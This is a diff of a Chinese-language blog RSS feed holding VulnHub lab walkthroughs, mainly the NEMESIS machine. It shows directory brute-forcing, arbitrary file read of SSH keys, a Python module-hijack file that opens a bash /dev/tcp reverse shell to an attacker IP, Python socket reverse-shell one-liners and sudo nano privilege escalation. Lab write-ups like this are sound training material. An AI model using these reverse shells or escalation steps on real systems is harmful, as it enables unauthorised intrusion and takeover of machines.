+&lt;p&gt;&lt;code&gt;Login Details =&amp;gt; username : hacker_in_the_town password : thanos&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1404.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;找到登陆界面，用这个账户密码尝试登陆&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1405.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;登陆成功，但是进入到登陆后的界面，查询之后没有任何发现&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1406.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;用字典爆破目录，收集目录信息信息&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.0.184/&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1407.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;依次访问几个目录发现没有比较明显的漏洞，换个字典，在爆破一波目录&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirb/common.txt -u http://192.168.0.184/&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1408.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;爆出来的目录里边都没有什么发现，看一下下一个端口网站&lt;/p&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODQ6NTI4NDUv&#34;&gt;http://192.168.0.184:52845/&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1410.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.0.184:52845&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1411.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirb/common.txt -u http://192.168.0.184:52845/&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1412.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;目录都没有什么问题，看来只能对页面的功能点尝试了&lt;/p&gt;
+&lt;h3 id=&#34;任意文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件读取&#34;&gt;#&lt;/a&gt; 任意文件读取&lt;/h3&gt;
+&lt;p&gt;在如下界面中，找到一个发送信息的功能，输入了如下信息之后发现有回显&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1414.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;点击发送消息后，读取到了 passwd 文件，审查源代码进行规范化，我们拿到了有 shell 的三个用户分别为 root，carlos，thanos&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1415.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;既然能读取文件，不妨测试一下是否能读到私钥文件，通过私钥文件登陆靶机&lt;/p&gt;
+&lt;p&gt;依次读取这三个用户下的.ssh 文件夹下的 id_rsa 文件&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1416.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;root 下的没有读取到，可能是做了权限设置或者不存在私钥文件&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1417.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;thanos 下的读取到了，审查源代码处复制私钥到本地&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1418.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;最后把 carlos 下的私钥文件看看&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1419.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;这个用户下的私钥文件也没有读取到&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1420.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;特权用户计划任务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#特权用户计划任务&#34;&gt;#&lt;/a&gt; 特权用户计划任务&lt;/h3&gt;
+&lt;p&gt;根据泄漏的私钥文件登陆到靶机中，注意修改私钥文件的权限&lt;br&gt;
+ &lt;code&gt;chmod 600 thanos_id_rsa&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;ssh thanos@192.168.31.47 -p 52846 -i ~/Desktop/vulnhub/nemesis/thanos_id_rsa&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1421.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在靶机上看到了一个备份文件内容如下&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1422.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;上传 pspy 监控，看这个备份脚本有没有定期被执行&lt;br&gt;
+ &lt;code&gt;wget 192.168.0.168/pspy64s -q ;chmod +x pspy64s;./pspy64s&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1423.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;看到这个 UID=1000 的用户定期执行了 backup.py 这个脚本，而在前面收集到的 /etc/passwd 文件可知，UID=1000 的用户是 carlos&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1424.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;分析这个备份文件，可知它引入了 zipfile 这个包，而它会优先在同一目录下寻找 zipfile，当脚本将被执行时，它不会使用 zipfile 模块，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS16aXBmaWxlLTJkNWsyY3NyaDlzcXQ5YXpmbWg1YnI0Znp0dzZwOWR4MzlhdWQyZC5weQ==&#34;&gt;而是会导入我们的恶意软件 zipfile.py&lt;/span&gt;，并且我们的反向 shell 也会被执行。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;可在本地尝试此命令是否能反弹shell：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; zipfile.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ZIP_DEFLATED = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class ZipFile:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	def close(*args):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		return&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	def write(*args):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		return&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	def __init__(self, *args):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		return&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__import__(&amp;#x27;os&amp;#x27;).system(&amp;#x27;bash -c &amp;quot;bash -i&amp;gt;&amp;amp; /dev/tcp/192.168.0.168/4444 0&amp;gt;&amp;amp;1&amp;quot;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1425.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;py反弹shell优化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#py反弹shell优化&#34;&gt;#&lt;/a&gt; py 反弹 shell 优化&lt;/h3&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;也可以不用借助bash直接用python来反弹shell，本地测试能否用在上靶机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.0.168&amp;quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;上面的这个脚本不会反弹处标准shell，下面的这个会反弹处标准终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.0.168&amp;quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&amp;quot;HISTFILE&amp;quot;,&amp;quot;/dev/null&amp;quot;);pty.spawn(&amp;quot;/bin/bash&amp;quot;);s.close()&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;仿射加密法解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#仿射加密法解密&#34;&gt;#&lt;/a&gt; 仿射加密法解密&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;现在成功拿到了 carlos 用户，即 UID= 1000 用户的终端，看到一个加密脚本仿射加密法与单码加密法没什么不同，因为明文的每个字母分别只映射到一个密文字母。仿射密码的加密算法就是一个线性变换，即对任意的明文字符 x，对应的密文字符为 y=e (x)=ax+b (mod26)，其中，a,b∈Z 26 ，且要求 gcd (a, 26 )= 1 , 函数 e (x) 称为仿射加密函数。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1426.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;并且在此目录下找到了一个文件提示说密码为&lt;/p&gt;
+&lt;p&gt;The password format is “****&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;FUN&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;”&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;此脚本的作用就是将原密码加密后变成了 FAJSRWOXLAXDQZAWNDDVLSU 要两个 key 值，知道 FUN 经过加密后变成了 QZA，依此推断 key 的范围。关于更多放射密码可访问 https://en.wikipedia.org/wiki/Affine_cipher&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; 1.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	def affine_encrypt(text, key):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return &amp;#x27;&amp;#x27;.join([ chr((( key[0]*(ord(t) - ord(&amp;#x27;A&amp;#x27;)) + key[1] ) % 26) + ord(&amp;#x27;A&amp;#x27;)) for t in text.upper().replace(&amp;#x27; &amp;#x27;, &amp;#x27;&amp;#x27;) ])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	affine_text=&amp;quot;FUN&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	for key0 in range(65, 91):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		for key1 in range(65, 91):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			encrypt_text = affine_encrypt(affine_text, [key0, key1])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			if encrypt_text == &amp;quot;QZA&amp;quot;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				print(key0,key1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				sys.exit(0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1427.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;得到 key 为（ 89 ， 65 ）之后，编写解密文件，进行解密密码&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; 2.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def affine_decrypt(cipher):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	text = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	for t in cipher:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		b = ord(t) - ord(&amp;#x27;A&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		for x in range(0, 26):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			result = (65 + x*89 - b) % 26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			if result == 0:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				text.append(chr(x + ord(&amp;#x27;A&amp;#x27;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	print(&amp;#x27;&amp;#x27;.join(text))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	affine_encrypted_text = &amp;quot;FAJSRWOXLAXDQZAWNDDVLSU&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	affine_decrypt(affine_encrypted_text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1428.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;得到的密码测试之后是属于 carlos 用户的密码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1429.png&#34; width=&#34;240&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;sudonano提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudonano提权&#34;&gt;#&lt;/a&gt; sudo (nano) 提权&lt;/h3&gt;
+&lt;p&gt;有了密码之后可以看到 carlos 用户权限设置&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1430.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;nano 的权限设置错误了&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看gtfobins找到了提权命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo /bin/nano /opt/priv&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ctrl + R&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ctrl + X&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reset; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1431.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/145%20TORANDO/</guid>
             <title>VULNHUB 45 TORANDO</title>
             <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/145%20TORANDO/</link>
@@ -679,265 +1141,254 @@ socat -d -d file: &lt;code&gt;tty&lt;/code&gt; ,raw,echo=0 TCP-LISTEN:8080&lt;/p
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/146%20NEMESIS/</guid>
-            <title>VULNHUB 46 NEMESIS</title>
-            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/146%20NEMESIS/</link>
+            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/150%20POWERGRID/</guid>
+            <title>VULNHUB 50 POWERGRID</title>
+            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/150%20POWERGRID/</link>
             <category>VULNHUB 41-50</category>
             <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEtbmVtZXNpcy0xMDEsNTgyLw==&#34;&gt;https://www.vulnhub.com/entry/ia-nemesis-101,582/&lt;/span&gt;&lt;br&gt;
- 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaW5mb3NlY2FydGljbGVzLmNvbS9uZW1lc2lzLXZ1bG5odWItd2Fsa3Rocm91Z2gv&#34;&gt;https://www.infosecarticles.com/nemesis-vulnhub-walkthrough/&lt;/span&gt;&lt;/p&gt;
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcG93ZXJncmlkLTEwMSw0ODUv&#34;&gt;https://www.vulnhub.com/entry/powergrid-101,485/&lt;/span&gt;&lt;br&gt;
+ 教程链接地址 1: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pvbmFoX0JhcmUvYXJ0aWNsZS9kZXRhaWxzLzEwNjk2MTQ3Nw==&#34;&gt;https://blog.csdn.net/Jonah_Bare/article/details/106961477&lt;/span&gt;&lt;br&gt;
+ 教程链接地址 2: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL3Bvd2VyZ3JpZC0xLTAtMS12dWxuaHViLXdhbGt0aHJvdWdoLw==&#34;&gt;https://www.hackingarticles.in/powergrid-1-0-1-vulnhub-walkthrough/&lt;/span&gt;&lt;/p&gt;
 &lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
 &lt;p&gt;攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
- 靶机 NEMESIS：桥接于 192.168.0.1 的网卡，ip 未知&lt;/p&gt;
+ 靶机 POWERGRID：桥接于 192.168.0.1 的网卡，ip 未知&lt;/p&gt;
 &lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
 由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
  &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1399.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;2 ）粗略的识别一下该 ip 上开放了哪些端口&lt;br&gt;
- &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1400.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 靶机 ip：192.168.0.184 靶机开放端口 80&lt;/p&gt;
-&lt;p&gt;3 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1402.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1554.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1555.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.1 90 --min-rate=5000&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1556.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xOTAv&#34;&gt;http://192.168.0.190/&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1557.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;收集到了三个用户名 deez 1 、p48 和 all 2&lt;/p&gt;
+&lt;p&gt;用 common.txt 字典扫了一波，没有扫到有价值的信息&lt;/p&gt;
